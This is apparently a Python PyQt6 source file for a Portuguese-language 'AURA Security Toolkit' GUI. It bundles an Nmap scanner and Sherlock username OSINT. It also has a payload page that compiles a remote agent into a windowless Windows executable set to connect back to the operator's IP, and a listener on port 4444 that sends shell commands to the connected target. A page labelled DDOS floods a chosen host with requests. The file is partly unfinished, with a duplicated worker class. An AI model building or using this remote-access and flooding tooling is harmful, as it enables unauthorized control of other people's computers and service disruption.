# AURA/security_toolkit.py

import os
import sys
import json
import re
import subprocess
import platform
import socket
import threading
import webbrowser
import requests
from datetime import datetime
from core.sherlock import SherlockEngine
from PyQt6.QtCore import (
    Qt, QTimer, QTime, QSize, 
    QLocale, QThread, pyqtSignal, QPropertyAnimation, QPoint, QEasingCurve
)
from PyQt6.QtGui import (
    QFont, QIcon, QColor, QPalette, QBrush, QPixmap, 
    QPainter, QRegion
)
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QStackedWidget,
    QVBoxLayout, QHBoxLayout, QFrame, QPushButton, QSpacerItem,
    QSizePolicy, QLineEdit, QGroupBox, QScrollArea, QGraphicsDropShadowEffect,
    QMessageBox, QCheckBox, QSpinBox, QTextEdit, QGridLayout, QSpacerItem, QSizePolicy
)
from random import randint 

from core.stress_test import StressTestExecutor

from core.components import (
    NeonCard, ConfigPage, 
    load_language_json, lang_get 
) 
from core import network_scanner 
from core.config import (
    THEMES, NEON_DEFAULT, load_user_settings,
    save_user_settings, ThemeManager 
)


# --- 1. CLASSE WORKER (Para não congelar a UI durante o Nmap) ---
class ScannerWorker(QThread):
    finished = pyqtSignal(list)
    error = pyqtSignal(str)

    def __init__(self, ip_targets: list):
        super().__init__()
        self.ip_targets = ip_targets

    def run(self):
        try:
            results = network_scanner.scan_network_target(self.ip_targets)
            self.finished.emit(results)
        except Exception as e:
            self.error.emit(str(e))


# --- 2. CLASSE DA PÁGINA DE SCANNER ---
class ScannerPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.last_results = None 
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)

        ip_group = QGroupBox("Alvos de Varredura (IPs/Ranges)")
        ip_group.setObjectName("targets_group")
        ip_layout = QVBoxLayout()
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Ex: 192.168.1.1, 10.0.0.0/24, 172.16.1.1-10 (separados por vírgula ou espaço)")
        ip_layout.addWidget(self.ip_input)
        
        self.start_button = QPushButton("Iniciar Varredura Nmap")
        self.start_button.clicked.connect(self.start_scan)
        ip_layout.addWidget(self.start_button)
        
        ip_group.setLayout(ip_layout)
        layout.addWidget(ip_group)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        result_group = QGroupBox("Resultados")
        result_group.setObjectName("results_group")
        result_layout = QVBoxLayout()
        
        self.results_text = QLabel("Aguardando varredura...")
        self.results_text.setWordWrap(True)
        self.results_text.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.MinimumExpanding)
        self.results_text.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        
        result_layout.addWidget(self.results_text)
        result_group.setLayout(result_layout)
        scroll_area.setWidget(result_group)
        layout.addWidget(scroll_area)

        self.save_button = QPushButton("Salvar Resultados no Logs/Relatórios")
        self.save_button.setEnabled(False)
        self.save_button.clicked.connect(self.save_results)
        layout.addWidget(self.save_button)

        layout.addStretch()
        self.setLayout(layout)

    def update_ui_language(self, L):
        self.start_button.setText(lang_get(L, "scanner_page.start_scan", "Iniciar Varredura Nmap"))
        self.save_button.setText(lang_get(L, "scanner_page.save_results", "Salvar Resultados no Logs/Relatórios"))
        self.ip_input.setPlaceholderText(lang_get(L, "scanner_page.ip_placeholder", "Ex: 192.168.1.1, 10.0.0.0/24, etc."))
        
        self.findChild(QGroupBox, "targets_group").setTitle(
            lang_get(L, "scanner_page.targets_group", "Alvos de Varredura (IPs/Ranges)")
        )
        self.findChild(QGroupBox, "results_group").setTitle(
            lang_get(L, "scanner_page.results_group", "Resultados")
        )
        if self.last_results is None or self.results_text.text().startswith("Iniciando"):
            self.results_text.setText(lang_get(L, "scanner_page.awaiting_scan", "Aguardando varredura..."))

    def start_scan(self):
        ips_raw = self.ip_input.text()
        if not ips_raw.strip():
            self.results_text.setText("Por favor, insira pelo menos um IP ou range.")
            return

        ip_list = re.split(r'[,\s]+', ips_raw) 
        ip_list = [ip.strip() for ip in ip_list if ip.strip()]

        if not ip_list:
            self.results_text.setText("Nenhum IP válido encontrado.")
            return

        self.start_button.setEnabled(False)
        self.save_button.setEnabled(False)
        self.results_text.setText(f"Iniciando varredura em {len(ip_list)} alvos... (Pode demorar)")
        self.parent_window.status_label.setText("Varrendo rede...")

        self.worker = ScannerWorker(ip_list)
        self.worker.finished.connect(self.scan_finished)
        self.worker.error.connect(self.scan_error)
        self.worker.start()

    def scan_finished(self, results: list):
        self.last_results = results
        self.start_button.setEnabled(True)
        self.save_button.setEnabled(True)
        self.parent_window.status_label.setText("Varredura concluída!")
        
        display_text = ""
        for host in results:
            if host.get("error"):
                display_text += f"<b>--- ERRO em {host['ip']} ---</b><br>{host['error']}<br><br>"
                continue

            display_text += f"<b>--- IP: {host.get('ip', 'N/A')} ---</b><br>"
            display_text += f"<b>OS:</b> {host.get('os', 'Desconhecido')}<br>"
            
            ports = host.get('open_ports', [])
            if ports:
                display_text += "<i>Portas Abertas:</i><br>"
                for p in ports:
                    display_text += f"&nbsp; - <b>{p['port']}/{p['protocol']}</b>: {p['service']}<br>"
            else:
                display_text += "Nenhuma porta aberta encontrada.<br>"

            vulns = host.get('vulnerabilities', [])
            if vulns:
                display_text += "<i>Vulnerabilidades Potenciais:</i><br>"
                for i, v in enumerate(vulns):
                    v_short = v.replace('\n', ' ').strip()
                    display_text += f"&nbsp; - <b>VULN {i+1}</b>: {v_short[:100]}...<br>"
            
            display_text += "<br>"
        
        self.results_text.setText(display_text)

    def scan_error(self, message):
        self.start_button.setEnabled(True)
        self.parent_window.status_label.setText("ERRO durante varredura!")
        self.results_text.setText(f"Um erro inesperado ocorreu: {message}. Verifique se o Nmap está instalado e se você tem permissões de sudo.")
        self.last_results = None

    def save_results(self):
        if self.last_results:
            log_dir = os.path.join(self.parent_window.base_dir, "logs")
            os.makedirs(log_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(log_dir, f"scan_report_{timestamp}.json")
            
            try:
                network_scanner.save_json(self.last_results, filename)
                self.parent_window.status_label.setText(f"Relatório salvo em logs/{os.path.basename(filename)}")
                self.save_button.setEnabled(False)
            except Exception as e:
                self.parent_window.status_label.setText(f"Falha ao salvar relatório: {e}")
# --- CLASSE WORKER PARA O SHERLOCK ---
class SherlockWorker(QThread):
    result_found = pyqtSignal(str, str)
    finished = pyqtSignal()

    def __init__(self, username):
        super().__init__()
        self.username = username
        self.engine = SherlockEngine() # Usa a lógica da pasta core

    def run(self):
        self.engine.search_user(self.username, self.result_found.emit)
        self.finished.emit()

# --- CLASSE DA INTERFACE DO SHERLOCK ---
class SherlockPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        title = QLabel("🔍 Sherlock OSINT")
        title.setFont(QFont("Arial", 22, QFont.Weight.Bold))
        layout.addWidget(title)

        # Container do Input
        search_box = QFrame()
        search_box.setStyleSheet("background: #1a1a1a; border-radius: 10px; padding: 5px;")
        search_layout = QHBoxLayout(search_box)

        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("Digite o username alvo...")
        self.user_input.setStyleSheet("border: none; background: transparent; padding: 10px; font-size: 16px; color: white;")
        
        # BOTÃO ESTILIZADO
        self.btn_investigate = QPushButton("INVESTIGAR")
        self.btn_investigate.setCursor(Qt.CursorShape.PointingHandCursor)
        neon = self.parent_window.theme_manager.neon_color
        self.btn_investigate.setStyleSheet(f"""
            QPushButton {{
                background-color: transparent;
                border: 2px solid {neon};
                color: {neon};
                padding: 10px 25px;
                border-radius: 5px;
                font-weight: bold;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{
                background-color: {neon};
                color: #000;
            }}
            QPushButton:disabled {{
                border-color: #555;
                color: #555;
            }}
        """)
        self.btn_investigate.clicked.connect(self.run_sherlock)

        search_layout.addWidget(self.user_input)
        search_layout.addWidget(self.btn_investigate)
        layout.addWidget(search_box)

        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setStyleSheet("border: none; background: transparent;")
        self.results_container = QWidget()
        self.results_layout = QVBoxLayout(self.results_container)
        self.results_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        self.scroll.setWidget(self.results_container)
        layout.addWidget(self.scroll)

    def run_sherlock(self):
        username = self.user_input.text().strip()
        if not username: return

        for i in reversed(range(self.results_layout.count())): 
            self.results_layout.itemAt(i).widget().setParent(None)

        self.btn_investigate.setEnabled(False)
        self.thread = SherlockWorker(username)
        self.thread.result_found.connect(self.add_result_card)
        # Conecta o término ao salvamento
        self.thread.finished.connect(lambda res: self.finalize_search(username, res))
        self.thread.start()

    def finalize_search(self, username, results):
        self.btn_investigate.setEnabled(True)
        self.btn_investigate.setText("INVESTIGAR")
        
        if results:
            # Salva o arquivo e pega o caminho completo
            path = SherlockEngine().save_to_json(username, results, self.parent_window.base_dir)
            filename = os.path.basename(path)
            
            # Atualiza o status na barra inferior
            self.parent_window.status_label.setText(f"Relatório salvo: {filename}")
            
            # MOSTRA A MENSAGEM DE SUCESSO (Pop-up)
            msg = QMessageBox(self)
            msg.setWindowTitle("Busca Finalizada")
            msg.setIcon(QMessageBox.Icon.Information)
            msg.setText(f"A investigação de '{username}' foi concluída!")
            msg.setInformativeText(f"O arquivo foi gerado com sucesso em:\n\n{path}")
            
            # Estilização rápida do pop-up para combinar com o tema escuro
            msg.setStyleSheet("""
                QMessageBox { background-color: #1a1a1a; }
                QLabel { color: white; }
                QPushButton { 
                    background-color: #333; color: white; 
                    padding: 5px 15px; border-radius: 3px; 
                }
            """)
            msg.exec()
            
        else:
            self.parent_window.status_label.setText("Nenhum resultado encontrado.")
            QMessageBox.warning(self, "Aviso", "Nenhuma rede social encontrada para este username.")

    def add_result_card(self, site, url):
        card = QFrame()
        card.setStyleSheet(f"background: #222; border-left: 4px solid {self.parent_window.theme_manager.neon_color}; border-radius: 5px; margin-bottom: 5px;")
        l = QHBoxLayout(card)
        l.addWidget(QLabel(f"<b>{site}</b>: {url}"))
        btn = QPushButton("Abrir")
        btn.clicked.connect(lambda: webbrowser.open(url))
        l.addWidget(btn)
        self.results_layout.addWidget(card)


class FirewallPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.L = parent_window.L
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        title_label = QLabel("🛡️ Teste de Firewall e Acesso Remoto")
        title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title_label)

        desc_text = (
            "Este teste valida as permissões de execução do sistema e a capacidade de "
            "interação com o usuário. Ele verifica se o ambiente bloqueia scripts externos "
            "ou diálogos de segurança, simulando o comportamento de ferramentas de monitoramento."
        )
        description = QLabel(desc_text)
        description.setWordWrap(True)
        description.setStyleSheet(f"color: {THEMES['dark']['text_secondary']};")
        layout.addWidget(description)

        action_group = QGroupBox("Execução do Teste")
        action_layout = QVBoxLayout()
        
        self.btn_local = QPushButton("Iniciar no Computador Local")
        self.btn_local.setFixedHeight(45)
        self.btn_local.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_local.clicked.connect(self.run_local_test)
        
        self.btn_remote = QPushButton("Iniciar em Host Remoto (Em breve)")
        self.btn_remote.setFixedHeight(45)
        self.btn_remote.setEnabled(True)
        self.btn_remote.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(7)) 
        
        action_layout.addWidget(self.btn_local)
        action_layout.addWidget(self.btn_remote)
        action_group.setLayout(action_layout)
        layout.addWidget(action_group)

        self.log_output = QLabel("Aguardando comando...")
        self.log_output.setStyleSheet("""
            background-color: #050505; 
            border: 1px solid #2a2a2a; 
            padding: 10px; 
            font-family: 'Consolas';
        """)
        self.log_output.setAlignment(Qt.AlignmentFlag.AlignTop)
        self.log_output.setWordWrap(True)
        layout.addWidget(self.log_output)

        layout.addStretch()
        self.setLayout(layout)

    def run_local_test(self):
        """Executa o teste e lida com a interface."""
        try:
            from core.interaction_test import run_interaction_test
            
            self.btn_local.setEnabled(False)
            self.btn_local.setText("Teste em Andamento...")
            self.log_output.setText("<b>[INFO]</b> O teste de interação foi iniciado.")
            
            run_interaction_test(self.parent_window)
            
            self.btn_local.setEnabled(True)
            self.btn_local.setText("Iniciar no Computador Local")
            
            log_path = os.path.join(self.parent_window.base_dir, "logs", "teste_interacao.log")
            self.update_log_view(log_path)
            
        except Exception as e:
            self.btn_local.setEnabled(True)
            self.btn_local.setText("Iniciar no Computador Local")
            self.log_output.setText(f"<b>[ERRO]</b>: {e}")

    def update_log_view(self, path):
        """ESTE ERA O MÉTODO QUE ESTAVA FALTANDO!"""
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read()
                    self.log_output.setText(f"<pre>{content[-500:]}</pre>")
            else:
                self.log_output.setText("<b>[INFO]</b> Teste concluído, mas o arquivo de log não foi gerado.")
        except Exception as e:
            self.log_output.setText(f"<b>[ERRO]</b> ao ler log: {e}")

    def update_ui_language(self, L):
        self.L = L

# --- PAGINA DO AGENTE (Ta dificil para um karalho de resolver isso) ---

class PayloadPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        title = QLabel("📦 Gerador de Agente Remoto (Payload)")
        title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title)

        desc = QLabel("Selecione o sistema operacional do computador alvo para gerar o agente de conexão.")
        desc.setStyleSheet("color: #aaaaaa;")
        layout.addWidget(desc)

        self.btn_win = QPushButton("🪟 Gerar Agente para Windows (.exe)")
        self.btn_win.setFixedHeight(50)
        self.btn_win.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_win.clicked.connect(lambda: self.generate_payload("windows"))

        self.btn_lin = QPushButton("🐧 Gerar Agente para Linux (.py)")
        self.btn_lin.setFixedHeight(50)
        self.btn_lin.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_lin.clicked.connect(lambda: self.generate_payload("linux"))

        self.btn_go_listener = QPushButton("Ir para Painel de Controle 📡")
        self.btn_go_listener.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(8))
        layout.addWidget(self.btn_go_listener)

        layout.addWidget(self.btn_win)
        layout.addWidget(self.btn_lin)

        self.status_log = QLabel("Aguardando seleção...")
        self.status_log.setStyleSheet("background: #111; padding: 10px; border: 1px solid #333;")
        layout.addWidget(self.status_log)

        layout.addStretch()
        
        btn_back = QPushButton("⬅ Voltar")
        btn_back.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(6))
        layout.addWidget(btn_back)

    def generate_payload(self, os_type):
        import socket
        import subprocess
        
        try:
            s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_temp.connect(("8.8.8.8", 80))
            my_ip = s_temp.getsockname()[0]
            s_temp.close()
        except:
            my_ip = "127.0.0.1"

        self.status_log.setText(f"<b>[INFO]</b> Gerando agente para {os_type} (IP: {my_ip})...")
        QApplication.processEvents()

        try:
            payload_dir = os.path.join(self.parent_window.base_dir, "logs", "payloads")
            os.makedirs(payload_dir, exist_ok=True)
            
            agent_template_path = os.path.join(self.parent_window.base_dir, "core", "aura_agent.py")
            
            if not os.path.exists(agent_template_path):
                self.status_log.setText("<b>[ERRO]</b> Arquivo 'core/aura_agent.py' não encontrado!")
                return

            with open(agent_template_path, "r", encoding="utf-8") as f:
                content = f.read()

            content = content.replace('###IP_CONFIG###', my_ip)

            if os_type == "linux":
                output_file = os.path.join(payload_dir, "aura_agent_linux.py")
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(content)
                self.status_log.setText(f"<b>[SUCESSO]</b> Agente Linux pronto em: <br>{output_file}")
                pass

            elif os_type == "windows":
                temp_py = os.path.join(payload_dir, "temp_win_agent.py")
                with open(temp_py, "w", encoding="utf-8") as f:
                    f.write(content)
                
                self.status_log.setText("<b>[INFO]</b> Compilando EXE... Aguarde.")
                QApplication.processEvents()

                import sys
                cmd = f'"{sys.executable}" -m PyInstaller --onefile --noconsole --noconfirm --distpath "{payload_dir}" "{temp_py}"'
                
                processo = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = processo.communicate()
                
                if processo.returncode == 0:
                    self.status_log.setText(f"<b>[SUCESSO]</b> Agente gerado!<br>Arquivo: <b>temp_win_agent.exe</b>")
                else:
                    print(f"ERRO DE COMPILAÇÃO:\n{stderr.decode()}")
                    self.status_log.setText("<b>[ERRO]</b> Falha ao compilar. Verifique o terminal.")

        except Exception as e:
            self.status_log.setText(f"<b>[ERRO]</b>: {str(e)}")

# --- PAGINA DE CONTROLE ---

class ListenerPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.server_socket = None
        self.client_socket = None
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        self.title = QLabel("📡 Painel de Controle Remoto")
        self.title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(self.title)

        self.status_conn = QLabel("Status: Aguardando ativação...")
        self.status_conn.setStyleSheet("color: orange; font-weight: bold;")
        layout.addWidget(self.status_conn)

        self.console_output = QLabel("Log do Servidor...")
        self.console_output.setStyleSheet("background-color: black; color: #00ff00; padding: 10px; font-family: 'Consolas';")
        self.console_output.setWordWrap(True)
        self.console_output.setAlignment(Qt.AlignmentFlag.AlignTop)
        layout.addWidget(self.console_output)

        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Digite um comando (ex: stress_test, dir, whoami)...")
        self.cmd_input.setEnabled(False)
        self.cmd_input.returnPressed.connect(self.send_command)
        layout.addWidget(self.cmd_input)

        self.btn_listen = QPushButton("Ativar Escuta (Porta 4444)")
        self.btn_listen.clicked.connect(self.start_listening_thread)
        layout.addWidget(self.btn_listen)

        layout.addStretch()

    def start_listening_thread(self):
        self.btn_listen.setEnabled(False)
        self.status_conn.setText("Status: Escutando na porta 4444...")
        thread = threading.Thread(target=self.start_server, daemon=True)
        thread.start()

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(('0.0.0.0', 4444))
            self.server_socket.listen(1)
            
            self.client_socket, addr = self.server_socket.accept()
            self.status_conn.setText(f"Status: CONECTADO ao alvo ({addr[0]})")
            self.status_conn.setStyleSheet("color: #00ff00; font-weight: bold;")
            self.cmd_input.setEnabled(True)
        except Exception as e:
            self.console_output.setText(f"Erro no Servidor: {e}")

    def send_command(self):
        cmd = self.cmd_input.text()
        if cmd and self.client_socket:
            try:
                self.client_socket.send(cmd.encode())
                response = self.client_socket.recv(4096).decode()
                self.console_output.setText(f"> {cmd}\n{response}")
                self.cmd_input.clear()
            except Exception as e:
                self.status_conn.setText("Status: Conexão Perdida.")
                self.cmd_input.setEnabled(False)

# --- SHERLOCK ---

class SherlockWorker(QThread):
    result_found = pyqtSignal(str, str)
    finished = pyqtSignal(list) # Agora envia a lista completa ao fim

    def __init__(self, username):
        super().__init__()
        self.username = username
        self.engine = SherlockEngine()

    def run(self):
        # A search_user agora retorna a lista de dicionários
        results = self.engine.search_user(self.username, self.result_found.emit)
        self.finished.emit(results)

# --- DDOS ---

class StressTestPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.executor = None
        self.ui_timer = QTimer()
        self.ui_timer.timeout.connect(self.update_live_metrics)
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        # Cabeçalho Técnico
        title = QLabel("🛡️ Avaliação de Resiliência de Firewall")
        title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title)

        # Configurações de Alvo
        target_group = QGroupBox("Parâmetros do Alvo")
        t_layout = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP ou Host")
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(80)
        t_layout.addWidget(QLabel("Alvo:"))
        t_layout.addWidget(self.target_input, 3)
        t_layout.addWidget(QLabel("Porta:"))
        t_layout.addWidget(self.port_input, 1)
        target_group.setLayout(t_layout)
        layout.addWidget(target_group)

        # Configurações de Controle
        ctrl_group = QGroupBox("Controle de Tráfego")
        c_layout = QVBoxLayout()
        
        self.rps_input = QSpinBox()
        self.rps_input.setRange(1, 2000)
        self.rps_input.setValue(50)
        c_layout.addWidget(QLabel("Taxa Limite (Req/Segunda - RPS):"))
        c_layout.addWidget(self.rps_input)

        self.duration_input = QSpinBox()
        self.duration_input.setRange(5, 600)
        self.duration_input.setValue(30)
        c_layout.addWidget(QLabel("Duração do Teste (Segundos):"))
        c_layout.addWidget(self.duration_input)

        self.gradual_check = QCheckBox("Escalonamento Gradual (Ramp-up)")
        c_layout.addWidget(self.gradual_check)
        
        ctrl_group.setLayout(c_layout)
        layout.addWidget(ctrl_group)

        # DASHBOARD DE MÉTRICAS (VISUAL)
        self.metrics_box = QTextEdit()
        self.metrics_box.setReadOnly(True)
        self.metrics_box.setStyleSheet("background: black; color: #00ff00; font-family: Consolas; font-size: 14px;")
        self.metrics_box.setText("Aguardando início do teste...")
        layout.addWidget(self.metrics_box)

        self.btn_action = QPushButton("⚡ INICIAR AUDITORIA DE TRÁFEGO")
        self.btn_action.setFixedHeight(50)
        self.btn_action.clicked.connect(self.toggle_test)
        layout.addWidget(self.btn_action)

    def toggle_test(self):
        if self.executor and self.executor.is_running:
            self.executor.is_running = False
            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")
        else:
            self.executor = StressTestExecutor(
                target=self.target_input.text(),
                port=self.port_input.value(),
                rps_limit=self.rps_input.value(),
                duration=self.duration_input.value(),
                gradual=self.gradual_check.isChecked()
            )
            threading.Thread(target=self.executor.run, daemon=True).start()
            self.ui_timer.start(500) # Atualiza a cada meio segundo
            self.btn_action.setText("🛑 INTERROMPER TESTE")

    def update_live_metrics(self):
        if not self.executor: return
        
        s = self.executor.stats
        report = (
            f"--- MÉTRICAS EM TEMPO REAL ---\n"
            f"Total Enviado: {s['total_sent']}\n"
            f"Sucesso (200 OK): {s['success']}\n"
            f"Bloqueio DROP (Timeout): {s['timeout_drop']}\n"
            f"Bloqueio REJECT (RST): {s['reset_reject']}\n"
            f"Latência Média: {round(s['avg_latency'], 2)}ms\n"
            f"-----------------------------\n"
            f"Status: {'EXECUTANDO' if self.executor.is_running else 'FINALIZADO'}"
        )
        self.metrics_box.setText(report)
        
        if not self.executor.is_running:
            self.ui_timer.stop()
            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")

# --- CLASSE PRINCIPAL (MainWindow) ---

class MainWindow(QMainWindow):
    def safe_change_page(self, index):
        self.pages.setCurrentIndex(index)
        self.status_label.setText(f"Status: Página {index} carregada")

    def __init__(self, base_dir):
        super().__init__()
        self.base_dir = base_dir
        
        # Configurações e Idioma
        self.user_settings = load_user_settings(self.base_dir)
        self.theme_manager = ThemeManager(self.user_settings)
        self.current_lang_code = self.user_settings.get('language', 'pt') 
        self.L = load_language_json(self.current_lang_code, self.base_dir)
        
        self.setWindowTitle("AURA Security Toolkit")
        self.setGeometry(100, 100, 1200, 800)
        
        self._build_ui()

        # No final do __init__ da MainWindow
        self.show()
        # Isso força o Qt a processar todos os eventos de pintura pendentes
        QApplication.processEvents() 
        # Dá um "tapinha" no estilo para limpar o cache visual
        self.card_scanner.update()
        self.card_stress.update()
        self.card_firewall.update()
        self.card_osint.update()
        self.card_john.update()
        self.card_keylogger.update()
        
        # Aplicação de Tema e Idioma (Funções que você já deve ter)
        self._apply_theme(self.theme_manager.current_theme) 
        #self.update_ui_language(self.current_lang_code)

    def _refresh_neon_fix(self):
        """Limpa o cache visual e remove o aspecto borrado dos cards."""
        neon_color = self.theme_manager.neon_color
        # Busca todos os NeonCards e força o redesenho individual [cite: 95]
        for card in self.findChildren(NeonCard):
            card.set_neon_color(neon_color, self.theme_manager.current_theme)
            card.update()

    def _build_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # --- SIDEBAR ---
        self.sidebar = QFrame()
        self.sidebar.setFixedWidth(200)
        self.sidebar.setObjectName("Sidebar")
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(10, 20, 10, 10)
        sidebar_layout.setSpacing(10)
        
        self.title_label = QLabel("AURA")
        self.title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
        self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.title_label.setObjectName("AuraTitle")
        sidebar_layout.addWidget(self.title_label)
        
        self.btn_home = self._make_sidebar_button("Home", "🏠")
        self.btn_tools = self._make_sidebar_button("Ferramentas", "🛠️") 
        self.btn_scanner = self._make_sidebar_button("Scanner", "🛰️") 
        self.btn_scripts = self._make_sidebar_button("Scripts", "📜") 
        self.btn_logs = self._make_sidebar_button("Logs", "📁")    
        self.btn_config = self._make_sidebar_button("Configurações", "⚙️")
        
        self.sidebar_buttons = [self.btn_home, self.btn_tools, self.btn_scanner, self.btn_scripts, self.btn_logs, self.btn_config]
        for btn in self.sidebar_buttons:
            sidebar_layout.addWidget(btn)

        sidebar_layout.addItem(QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding))

        self.status_label = QLabel("Status: Pronto")
        sidebar_layout.addWidget(self.status_label)
        
        main_layout.addWidget(self.sidebar)

        # --- ÁREA DE CONTEÚDO ---
        self.content_frame = QFrame() 
        self.content_frame.setObjectName("ContentFrame")
        content_v_layout = QVBoxLayout(self.content_frame)
        content_v_layout.setContentsMargins(0, 0, 0, 0)
        
        self.pages = QStackedWidget()
        
        # --- PÁGINA HOME (Index 0) ---
        home_page = QWidget()
        home_layout = QVBoxLayout(home_page)
        self.welcome_label = QLabel("Bem-vindo ao AURA Security Toolkit!")
        self.welcome_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))
        home_layout.addWidget(self.welcome_label)
        
        # Grid para 6 cards (2 linhas x 3 colunas)
        card_grid = QGridLayout()
        card_grid.setSpacing(15)

        # Criando e configurando os cards
        self.card_scanner = NeonCard("🛰️", "Varredura", "Identifica hosts.", self.theme_manager.neon_color, self.theme_manager)
        self.card_scanner.on_card_activated = lambda: self.safe_change_page(2) 

        self.card_stress = NeonCard("🔥", "Stress Test", "Simulação DoS.", self.theme_manager.neon_color, self.theme_manager)
        self.card_stress.on_card_activated = lambda: self.safe_change_page(9)

        self.card_firewall = NeonCard("🛡️", "Firewall", "Verifica regras.", self.theme_manager.neon_color, self.theme_manager)
        self.card_firewall.on_card_activated = lambda: self.safe_change_page(6)

        self.card_osint = NeonCard("🔍", "Sherlock", "OSINT Social.", self.theme_manager.neon_color, self.theme_manager)
        self.card_osint.on_card_activated = lambda: self.safe_change_page(10)

        self.card_john = NeonCard("💀", "John Ripper", "Quebra hashes.", self.theme_manager.neon_color, self.theme_manager)
        self.card_john.on_card_activated = lambda: self.safe_change_page(11)

        self.card_keylogger = NeonCard("⌨️", "Key Auditor", "Log de teclado.", self.theme_manager.neon_color, self.theme_manager)
        self.card_keylogger.on_card_activated = lambda: self.safe_change_page(12)

        # Adicionando ao Grid (Linha, Coluna)
        card_grid.addWidget(self.card_scanner, 0, 0)
        card_grid.addWidget(self.card_stress, 0, 1)
        card_grid.addWidget(self.card_firewall, 0, 2)
        card_grid.addWidget(self.card_osint, 1, 0)
        card_grid.addWidget(self.card_john, 1, 1)
        card_grid.addWidget(self.card_keylogger, 1, 2)

        home_layout.addLayout(card_grid)
        home_layout.addStretch()
        self.pages.addWidget(home_page) # Index 0

        # --- REGISTRO DAS PÁGINAS (Índices 1 a 12) ---
        self.pages.addWidget(QLabel("Página Ferramentas (1)")) # Index 1
        
        self.scanner_page = ScannerPage(self)
        self.pages.addWidget(self.scanner_page) # Index 2
        
        self.pages.addWidget(QLabel("Página Scripts (3)")) # Index 3
        self.pages.addWidget(QLabel("Página Logs (4)")) # Index 4
        
        self.config_page = ConfigPage(self)
        self.pages.addWidget(self.config_page) # Index 5

        self.firewall_page = FirewallPage(self)
        self.pages.addWidget(self.firewall_page) # Index 6

        self.payload_page = PayloadPage(self)
        self.pages.addWidget(self.payload_page) # Index 7

        self.listener_page = ListenerPage(self)
        self.pages.addWidget(self.listener_page) # Index 8

        self.stress_page = StressTestPage(self)
        self.pages.addWidget(self.stress_page) # Index 9

        # --- AS NOVAS PÁGINAS (Indices 10, 11, 12) ---
        # --- Index 10: Sherlock OSINT (Substitua as linhas antigas por estas) ---
        self.osint_page = SherlockPage(self) # Cria a interface real
        self.pages.insertWidget(10, self.osint_page) 
        # Remova a linha antiga que criava o QWidget com a label "Módulo Sherlock OSINT"

        self.john_page = QWidget(); self.john_page.setLayout(QVBoxLayout()); self.john_page.layout().addWidget(QLabel("Módulo John The Ripper"))
        self.pages.addWidget(self.john_page) # Index 11

        self.keylogger_page = QWidget(); self.keylogger_page.setLayout(QVBoxLayout()); self.keylogger_page.layout().addWidget(QLabel("Módulo Key Auditor"))
        self.pages.addWidget(self.keylogger_page) # Index 12

        # Finalização
